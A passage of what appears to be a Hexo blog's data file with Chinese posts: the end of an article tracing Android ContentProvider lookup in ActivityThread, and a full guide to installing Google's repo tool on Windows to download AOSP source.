class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可见， <strong>ProviderKey</strong> 是ActivityThread当中的一个内部POJO，非常普通，没有对入参做任何特殊处理。那么ContentProvider也就是根据 <strong>authority</strong> 和 <strong>userId</strong> 来唯一确定的，对应了文章开头的介绍。<br>此外，由于Android目前是多用户操作系统（国产ROM淡化了此概念，但应用双开、系统分身等功能实现均与多用户有关），所以这里用户id是必要的。</p>\n<p>接下来看后一个问题， <strong>mProviderMap</strong> 从哪儿来？什么时候添加的Provider记录？很简单了，还是在ActivityThread当中，实例化如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@UnsupportedAppUsage</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> ArrayMap&lt;ProviderKey, ProviderClientRecord&gt; mProviderMap</span><br><span class=\"line\">    = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayMap</span>&lt;ProviderKey, ProviderClientRecord&gt;();</span><br></pre></td></tr></table></figure>\n\n<p>且仅有一处在进行 <code>put</code> 操作：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> ProviderClientRecord <span class=\"title function_\">installProviderAuthoritiesLocked</span><span class=\"params\">(IContentProvider provider,</span></span><br><span class=\"line\"><span class=\"params\">        ContentProvider localProvider, ContentProviderHolder holder)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> String auths[] = holder.info.authority.split(<span class=\"string\">&quot;;&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">userId</span> <span class=\"operator\">=</span> UserHandle.getUserId(holder.info.applicationInfo.uid);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (provider != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">ProviderClientRecord</span> <span class=\"variable\">pcr</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ProviderClientRecord</span>(</span><br><span class=\"line\">            auths, provider, localProvider, holder);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (String auth : auths) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">ProviderKey</span> <span class=\"variable\">key</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ProviderKey</span>(auth, userId);</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"type\">ProviderClientRecord</span> <span class=\"variable\">existing</span> <span class=\"operator\">=</span> mProviderMap.get(key);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (existing != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            mProviderMap.put(key, pcr); <span class=\"comment\">// 在此处添加的</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pcr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可见，ProviderClientRecord实例的构造是在这个 <code>installProviderAuthoritiesLocked</code> 私有方法中完成并添加到map中的。<br>这里有个小插曲<strong>特别注意</strong>：方法的第一行代码，对 <strong>authority</strong> 字符串进行了分割（分隔符为;），最终ProviderClientRecord的数量也取决于分割出来的数组。所以在Manifest配置文件中声明 <code>android:authorities</code> 属性时，可以填入多个授权host（就好比多个域名可以同时指向一个网站），以分号分割，难怪属性名要用复数呢。</p>\n<p>接下来看看 <code>installProviderAuthoritiesLocked</code> 方法的调用处：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@UnsupportedAppUsage</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> ContentProviderHolder <span class=\"title function_\">installProvider</span><span class=\"params\">(Context context,</span></span><br><span class=\"line\"><span class=\"params\">        ContentProviderHolder holder, ProviderInfo info,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"type\">boolean</span> noisy, <span class=\"type\">boolean</span> noReleaseNeeded, <span class=\"type\">boolean</span> stable)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">ContentProvider</span> <span class=\"variable\">localProvider</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    IContentProvider provider;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (holder == <span class=\"literal\">null</span> || holder.provider == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        provider = holder.provider;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ContentProviderHolder retHolder;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mProviderMap) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        <span class=\"type\">IBinder</span> <span class=\"variable\">jBinder</span> <span class=\"operator\">=</span> provider.asBinder();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (localProvider != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">ComponentName</span> <span class=\"variable\">cname</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ComponentName</span>(info.packageName, info.name);</span><br><span class=\"line\">            <span class=\"type\">ProviderClientRecord</span> <span class=\"variable\">pr</span> <span class=\"operator\">=</span> mLocalProvidersByName.get(cname);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (pr != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">                <span class=\"comment\">// 第一处调用</span></span><br><span class=\"line\">                pr = installProviderAuthoritiesLocked(provider, localProvider, holder);</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            retHolder = pr.mHolder;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">ProviderRefCount</span> <span class=\"variable\">prc</span> <span class=\"operator\">=</span> mProviderRefCountMap.get(jBinder);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (prc != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 第二处调用</span></span><br><span class=\"line\">                <span class=\"type\">ProviderClientRecord</span> <span class=\"variable\">client</span> <span class=\"operator\">=</span> installProviderAuthoritiesLocked(</span><br><span class=\"line\">                        provider, localProvider, holder);</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            retHolder = prc.holder;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retHolder;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由上， <code>installProviderAuthoritiesLocked</code> 方法的调用均在 <code>installProvider</code> 方法中。还记得上文的“插眼”吗？呼应上了。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><ul>\n<li><p>在我们使用ContentResolver来进行查询操作时，<code>query</code> 方法层层调用到 <strong>ActivityThread</strong> 的 <code>acquireExistingProvider</code> 方法，根据URI字符串当中的授权host（即 <strong>authority</strong> ）和当前所在用户的 <strong>userId</strong> 来获取对应的Provider实例。</p>\n</li>\n<li><p>当 <code>acquireExistingProvider</code> 获取不到时，则通过 <code>installProvider</code> 方法来安装Provider并把其载体 <strong>ProviderClientRecord</strong> 添加到 <strong>mProviderMap</strong> 中。</p>\n</li>\n<li><p>AndroidManifest中声明Provider时， <code>android:authorities</code> 属性可以填多个字符串，以分号分割：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">provider</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.provider.TestProvider&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">android:authorities</span>=<span class=\"string\">&quot;com.xxx.yyy.provider;cn.xxx.yyy.provider;net.xxx.yyy.provider&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">...</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>如此可以写成多种不同host的URI，映射的却还是同一个ContentProvider。具体的好处我能想到的有几点：</p>\n<ul>\n<li>与同IP多域名的网站一样，域名多样化，提前抢占一些host，避免三方假冒。</li>\n<li>提供不同的URI分别给内部和外部开发者使用，便于区分和数据统计。</li>\n</ul>\n</li>\n</ul>\n"},{"layout":"post","title":"Windows安装repo的真正解决方案","subtitle":"专治各种小毛病。","date":"2020-02-04T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> 2020-02-22更新！我发现谷歌在最近几天发布了git-repo 2.4版本，并更新了 [Microsoft Windows Details](https://gerrit.googlesource.com/git-repo/+/HEAD/docs/windows.md) 文档，直接解决了此文问题，比本文以前的三方解决办法简单很多很多。\n\n### 最新官方解决方案\n#### 一、基础设施\n- 安装最新的Git for Windows（参考下面的旧文即可），目前版本是2.25.1\n- **安装Python 3** ，目前版本是3.8.1，**不要安装Python 2**，这是和旧办法的不同之处\n- 配置各种环境变量（参照旧文即可），Python 3在安装的时候勾选Add path那项就能自动配置\n\n#### 二、搞起最新的repo工具\n和旧文的**安装Repo**步骤类似，只不过所有都替换成谷歌官方的：\n```bash\nmkdir ~/bin\ncurl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo\nchmod a+rx ~/bin/repo\n```\n然后**注意**，先下载最新的repo工具源码，再进行init操作：\n```bash\n# 先随便新建源码目录\nmkdir -p ~/AOSP/.repo\ncd ~/AOSP/.repo\n# clone工具集\ngit clone https://gerrit.googlesource.com/git-repo\n# 一定要改文件夹名\nmv git-repo repo\n# 回到AOSP源码目录\ncd ..\n# 保证你成功\nrepo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25 --worktree\n```\n这里的 `--worktree` 参数非常重要，不加的话会出现 **error.GitError: Cannot initialize work tree for manifests** 错误。这个功能也是谷歌在这个月底才更新的。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200222214938843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n最终我也试了下repo sync，repo upload等命令均无问题。\n\n---\n\n> 以下是旧文，强烈推荐分隔线以上的最新官方解决方案。\n\n### 背景\n2020真是魔幻的一年，受疫情影响，大家年后一段时间都远程办公了。奈何很多同事在家没有Linux开发环境，想在Windows上通过repo工具下载Android源码简直比登天还难。\n\n网上搜来受去没几个讲透彻的，今天给大家整活。按下面步骤来，保证OK，我们最终以 **repo init** 执行成功为目标。\n\n### 走起\n#### 一、安装Git for Windows\n先到官网（[https://git-scm.com/download/win](https://git-scm.com/download/win)）下载 **64-bit Git for Windows Setup** 然后安装，基本上一路下一步，但需要注意几点：\n\n - 第一步第一项有个Add icons什么的，即添加桌面图标，默认没勾，最好勾上。\n - 最后一步有3个Enable xxx，默认第3个（和symbollink相关）没勾，请把它勾上。\n \n#### 二、安装Python 2.7\n 先到官网（[https://www.python.org/downloads/release/python-2717/](https://www.python.org/downloads/release/python-2717/)）下载 **Windows x86-64 MSI installer** ，这貌似是Python 2时代的最后一个版本了。安装一路下一步即可。\n\n#### 三、配置系统环境变量\n上述俩基础组件装完了，检查一下环境变量，Path路径该加的加上，Windows如何查看并添加系统环境变量请大家自行搜索。需要添加如下：\n```bash\nC:\\Program Files\\Git\\cmd\nC:\\Program Files\\Git\\bin\nC:\\Program Files\\Git\\usr\\bin\nC:\\Python27\\\nC:\\Python27\\Scripts\\\n# 这一项不要忘了，先提前配置好，为repo做准备\nC:\\Users\\你的用户名\\bin\n```\n路径和你安装时的选择相关，切勿直接照抄。还是给大家整个图吧。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200205214724901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n#### 四、安装repo\nrepo原本是谷歌搞的一个方便下载AOSP的工具，基于git，但由于种种原因，不能直接在Windows上使用。但**好心的基佬Hub网友开发了一套改良版的repo**，适用于Windows，解决各种Error问题。\n\n首先要把repo命令脚本搞定。在任意处打开 **Git Bash** （点桌面的快捷方式也可以），然后：\n```bash\nmkdir ~/bin\ncurl https://raw.githubusercontent.com/esrlabs/git-repo/stable/repo > ~/bin/repo\ncurl https://raw.githubusercontent.com/esrlabs/git-repo/stable/repo.cmd > ~/bin/repo.cmd\nchmod a+rx ~/bin/repo\n```\n接下来，基本上就和Linux上的操作差不多了。但在repo init时，需要增加或修改 **repo-url** 参数，具体如下：\n```bash\n# 先随便新建源码目录\nmkdir ~/AOSP\ncd ~/AOSP\n# 初始化\nrepo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25 --repo-url=https://github.com/esrlabs/git-repo.git\n```\n**注意点：**\n\n - 上述命令关键就在 `--repo-url=https://github.com/esrlabs/git-repo.git` ，替换掉原生的repo工具链，就能成功初始化了。\n - 这里用的是清华镜像源AOSP作示例，一般做ROM开发的公司会有自己的仓库地址，请自行修改init链接。\n - 不要忘了生成ssh的public key，在Windows下也一样：在Git Bash中执行 `ssh-keygen` 然后复制 `~/.ssh/id_rsa.pub` 文件中的内容添加到Gerrit等源码平台上即可。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200205222055923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n - 如果发现上面下载速度太慢，可以把 [https://github.com/esrlabs/git-repo](https://github.com/esrlabs/git-repo) 项目直接下载下来并解压，复制解压后文件夹中的所有文件到源码目录的的 `.repo/repo` 子目录下面，然后再重新执行repo init命令，当然这次就不要带 **repo-url** 参数了。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200205221541817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n大功告成！\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200205222000447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n### 参考\n - [git-repo](https://github.com/esrlabs/git-repo)\n - [Microsoft Windows Details](https://gerrit.googlesource.com/git-repo/+/HEAD/docs/windows.md)\n - [windows环境下repo下载Android源代码](https://ressrc.com/2018/09/22/windows环境下repo下载android源代码/)\n - [window7下配置下载android源码环境,安装Repo](https://blog.csdn.net/nicolelili1/article/details/52527475)\n","source":"_posts/2020-02-05-Windows安装repo的真正解决方案.md","raw":"---\nlayout:     post\ntitle:      Windows安装repo的真正解决方案\nsubtitle:   专治各种小毛病。\ndate:       2020-02-05\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Windows\n    - AOSP\n    - Android\n---\n\n> 2020-02-22更新！我发现谷歌在最近几天发布了git-repo 2.4版本，并更新了 [Microsoft Windows Details](https://gerrit.googlesource.com/git-repo/+/HEAD/docs/windows.md) 文档，直接解决了此文问题，比本文以前的三方解决办法简单很多很多。\n\n### 最新官方解决方案\n#### 一、基础设施\n- 安装最新的Git for Windows（参考下面的旧文即可），目前版本是2.25.1\n- **安装Python 3** ，目前版本是3.8.1，**不要安装Python 2**，这是和旧办法的不同之处\n- 配置各种环境变量（参照旧文即可），Python 3在安装的时候勾选Add path那项就能自动配置\n\n#### 二、搞起最新的repo工具\n和旧文的**安装Repo**步骤类似，只不过所有都替换成谷歌官方的：\n```bash\nmkdir ~/bin\ncurl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo\nchmod a+rx ~/bin/repo\n```\n然后**注意**，先下载最新的repo工具源码，再进行init操作：\n```bash\n# 先随便新建源码目录\nmkdir -p ~/AOSP/.repo\ncd ~/AOSP/.repo\n# clone工具集\ngit clone https://gerrit.googlesource.com/git-repo\n# 一定要改文件夹名\nmv git-repo repo\n# 回到AOSP源码目录\ncd ..\n# 保证你成功\nrepo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25 --worktree\n```\n这里的 `--worktree` 参数非常重要，不加的话会出现 **error.GitError: Cannot initialize work tree for manifests** 错误。这个功能也是谷歌在这个月底才更新的。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200222214938843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n最终我也试了下repo sync，repo upload等命令均无问题。\n\n---\n\n> 以下是旧文，强烈推荐分隔线以上的最新官方解决方案。\n\n### 背景\n2020真是魔幻的一年，受疫情影响，大家年后一段时间都远程办公了。奈何很多同事在家没有Linux开发环境，想在Windows上通过repo工具下载Android源码简直比登天还难。\n\n网上搜来受去没几个讲透彻的，今天给大家整活。按下面步骤来，保证OK，我们最终以 **repo init** 执行成功为目标。\n\n### 走起\n#### 一、安装Git for Windows\n先到官网（[https://git-scm.com/download/win](https://git-scm.com/download/win)）下载 **64-bit Git for Windows Setup** 然后安装，基本上一路下一步，但需要注意几点：\n\n - 第一步第一项有个Add icons什么的，即添加桌面图标，默认没勾，最好勾上。\n - 最后一步有3个Enable xxx，默认第3个（和symbollink相关）没勾，请把它勾上。\n \n#### 二、安装Python 2.7\n 先到官网（[https://www.python.org/downloads/release/python-2717/](https://www.python.org/downloads/release/python-2717/)）下载 **Windows x86-64 MSI installer** ，这貌似是Python 2时代的最后一个版本了。安装一路下一步即可。\n\n#### 三、配置系统环境变量\n上述俩基础组件装完了，检查一下环境变量，Path路径该加的加上，Windows如何查看并添加系统环境变量请大家自行搜索。需要添加如下：\n```bash\nC:\\Program Files\\Git\\cmd\nC:\\Program Files\\Git\\bin\nC:\\Program Files\\Git\\usr\\bin\nC:\\Python27\\\nC:\\Python27\\Scripts\\\n# 这一项不要忘了，先提前配置好，为repo做准备\nC:\\Users\\你的用户名\\bin\n```\n路径和你安装时的选择相关，切勿直接照抄。还是给大家整个图吧。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200205214724901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n#### 四、安装repo\nrepo原本是谷歌搞的一个方便下载AOSP的工具，基于git，但由于种种原因，不能直接在Windows上使用。但**好心的基佬Hub网友开发了一套改良版的repo**，适用于Windows，解决各种Error问题。\n\n首先要把repo命令脚本搞定。在任意处打开 **Git Bash** （点桌面的快捷方式也可以），然后：\n```bash\nmkdir ~/bin\ncurl https://raw.githubusercontent.com/esrlabs/git-repo/stable/repo > ~/bin/repo\ncurl https://raw.githubusercontent.com/esrlabs/git-repo/stable/repo.cmd > ~/bin/repo.cmd\nchmod a+rx ~/bin/repo\n```\n接下来，基本上就和Linux上的操作差不多了。但在repo init时，需要增加或修改 **repo-url** 参数，具体如下：\n```bash\n# 先随便新建源码目录\nmkdir ~/AOSP\ncd ~/AOSP\n# 初始化\nrepo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25 --repo-url=https://github.com/esrlabs/git-repo.git\n```\n**注意点：**\n\n - 上述命令关键就在 `--repo-url=https://github.com/esrlabs/git-repo.git` ，替换掉原生的repo工具链，就能成功初始化了。\n - 这里用的是清华镜像源AOSP作示例，一般做ROM开发的公司会有自己的仓库地址，请自行修改init链接。\n - 不要忘了生成ssh的public key，在Windows下也一样：在Git Bash中执行 `ssh-keygen` 然后复制 `~/.ssh/id_rsa.pub` 文件中的内容添加到Gerrit等源码平台上即可。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200205222055923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n - 如果发现上面下载速度太慢，可以把 [https://github.com/esrlabs/git-repo](https://github.com/esrlabs/git-repo) 项目直接下载下来并解压，复制解压后文件夹中的所有文件到源码目录的的 `.repo/repo` 子目录下面，然后再重新执行repo init命令，当然这次就不要带 **repo-url** 参数了。\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200205221541817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n大功告成！\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20200205222000447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70)\n### 参考\n - [git-repo](https://github.com/esrlabs/git-repo)\n - [Microsoft Windows Details](https://gerrit.googlesource.com/git-repo/+/HEAD/docs/windows.md)\n - [windows环境下repo下载Android源代码](https://ressrc.com/2018/09/22/windows环境下repo下载android源代码/)\n - [window7下配置下载android源码环境,安装Repo](https://blog.csdn.net/nicolelili1/article/details/52527475)\n","slug":"Windows安装repo的真正解决方案","published":1,"updated":"2024-03-25T07:31:25.860Z","comments":1,"photos":[],"link":"","_id":"cluaufh0y002cthe6glufc6ix","content":"<blockquote>\n<p>2020-02-22更新！我发现谷歌在最近几天发布了git-repo 2.4版本，并更新了 <a href=\"https://gerrit.googlesource.com/git-repo/+/HEAD/docs/windows.md\">Microsoft Windows Details</a> 文档，直接解决了此文问题，比本文以前的三方解决办法简单很多很多。</p>\n</blockquote>\n<h3 id=\"最新官方解决方案\"><a href=\"#最新官方解决方案\" class=\"headerlink\" title=\"最新官方解决方案\"></a>最新官方解决方案</h3><h4 id=\"一、基础设施\"><a href=\"#一、基础设施\" class=\"headerlink\" title=\"一、基础设施\"></a>一、基础设施</h4><ul>\n<li>安装最新的Git for Windows（参考下面的旧文即可），目前版本是2.25.1</li>\n<li><strong>安装Python 3</strong> ，目前版本是3.8.1，<strong>不要安装Python 2</strong>，这是和旧办法的不同之处</li>\n<li>配置各种环境变量（参照旧文即可），Python 3在安装的时候勾选Add path那项就能自动配置</li>\n</ul>\n<h4 id=\"二、搞起最新的repo工具\"><a href=\"#二、搞起最新的repo工具\" class=\"headerlink\" title=\"二、搞起最新的repo工具\"></a>二、搞起最新的repo工具</h4><p>和旧文的<strong>安装Repo</strong>步骤类似，只不过所有都替换成谷歌官方的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/bin</span><br><span class=\"line\">curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> a+rx ~/bin/repo</span><br></pre></td></tr></table></figure>\n<p>然后<strong>注意</strong>，先下载最新的repo工具源码，再进行init操作：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 先随便新建源码目录</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p ~/AOSP/.repo</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/AOSP/.repo</span><br><span class=\"line\"><span class=\"comment\"># clone工具集</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://gerrit.googlesource.com/git-repo</span><br><span class=\"line\"><span class=\"comment\"># 一定要改文件夹名</span></span><br><span class=\"line\"><span class=\"built_in\">mv</span> git-repo repo</span><br><span class=\"line\"><span class=\"comment\"># 回到AOSP源码目录</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br><span class=\"line\"><span class=\"comment\"># 保证你成功</span></span><br><span class=\"line\">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r25 --worktree</span><br></pre></td></tr></table></figure>\n<p>这里的 <code>--worktree</code> 参数非常重要，不加的话会出现 <strong>error.GitError: Cannot initialize work tree for manifests</strong> 错误。这个功能也是谷歌在这个月底才更新的。<br><img src=\"https://imgconvert.csdnimg.cn/20200222214938843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>最终我也试了下repo sync，repo upload等命令均无问题。</p>\n<hr>\n<blockquote>\n<p>以下是旧文，强烈推荐分隔线以上的最新官方解决方案。</p>\n</blockquote>\n<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>2020真是魔幻的一年，受疫情影响，大家年后一段时间都远程办公了。奈何很多同事在家没有Linux开发环境，想在Windows上通过repo工具下载Android源码简直比登天还难。</p>\n<p>网上搜来受去没几个讲透彻的，今天给大家整活。按下面步骤来，保证OK，我们最终以 <strong>repo init</strong> 执行成功为目标。</p>\n<h3 id=\"走起\"><a href=\"#走起\" class=\"headerlink\" title=\"走起\"></a>走起</h3><h4 id=\"一、安装Git-for-Windows\"><a href=\"#一、安装Git-for-Windows\" class=\"headerlink\" title=\"一、安装Git for Windows\"></a>一、安装Git for Windows</h4><p>先到官网（<a href=\"https://git-scm.com/download/win\">https://git-scm.com/download/win</a>）下载 <strong>64-bit Git for Windows Setup</strong> 然后安装，基本上一路下一步，但需要注意几点：</p>\n<ul>\n<li>第一步第一项有个Add 